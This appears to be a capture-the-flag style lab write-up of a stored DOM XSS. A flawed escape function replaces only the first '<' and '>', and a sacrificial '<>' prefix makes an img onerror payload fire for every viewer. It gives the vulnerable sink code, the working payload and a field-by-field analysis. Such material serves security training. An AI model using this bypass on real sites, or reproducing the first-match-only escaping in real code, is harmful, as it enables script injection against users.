# Attack Chain — Stored DOM XSS via single-replace escape bypass

## The sink code (client, served verbatim)
```js
function escapeHTML(html) {
    return html.replace('<', '&lt;').replace('>', '&gt;');  // STRING pattern: FIRST match only
}
// …
commentBodyPElement.innerHTML = escapeHTML(comment.body);   // body sink
let newInnerHtml = firstPElement.innerHTML + escapeHTML(comment.author);
firstPElement.innerHTML = newInnerHtml;                      // author sink
websiteElement.setAttribute("href", comment.website);        // href sink (unescape, but scheme-gated)
avatarImgElement.setAttribute("src", escapeHTML(comment.avatar)); // inert sink
```

## Data flow (winning vector: body)
```
Attacker (own session): POST /post/comment { csrf, postId=1,
    comment="<><img src=x onerror=alert(1)>", name=…, email=…, website="" }
    → 302 → stored VERBATIM in comment JSON
   │
   ▼
Any viewer GETs /post?postId=1 → page XHRs /post/comment?postId=1 → JSON array
   │
   ▼
[SINK] displayComments(): escapeHTML("<><img src=x onerror=alert(1)>")
   │  1st '<' → &lt; ; 1st '>' → &gt;  (sacrificial pair consumed)
   │  remainder "<img src=x onerror=alert(1)>" passes INTACT
   ▼
[TRUST BOUNDARY CROSSED] innerHTML parses the surviving img → bogus src errors →
onerror fires on page load in app origin, viewer context
   ▼
RESULT: alert(1) for every current and future viewer, zero interaction
```

## Per-field verdicts (all tested or structurally closed)
| Field | Client path | Server gate | Verdict |
|---|---|---|---|
| `comment` (body) | `escapeHTML`→`innerHTML` | none (stored verbatim) | **SINK — bypass with sacrificial `<>`** |
| `name` (author) | `escapeHTML`→`innerHTML` (appended form) | none | PLAUSIBLE, same mechanism (not separately fired) |
| `website` | `setAttribute(href)`, NO escaping | scheme allowlist (400 on `javascript:`, case-insensitive) | DEAD — server gate holds |
| `email` | not consumed client-side | — | no sink |
| `avatar` | `escapeHTML`→`setAttribute(src)` | — | DEAD — attribute API never executes |

## Why the sacrificial pair is mandatory
`escapeHTML` consumes exactly one `<` and one `>` per call. A lone `<img…>` loses its
`<` (→ text); a lone trailing `>` is absorbed into the tag and corrupts the handler
(`onerror="alert(1)>"` — syntax error). Prefixing `<>` donates both replacements and
leaves the real tag byte-clean: `&lt;&gt;<img src=x onerror=alert(1)>`.

## Expected response sequence (verified)
1. `POST /post/comment` → 302; `GET /post/comment?postId=1` shows the body verbatim.
2. Viewer loads `/post?postId=1` → XHR → escape → `innerHTML` → img error → fire.
3. Real-browser `alert(1)` → `is-solved` (first poll).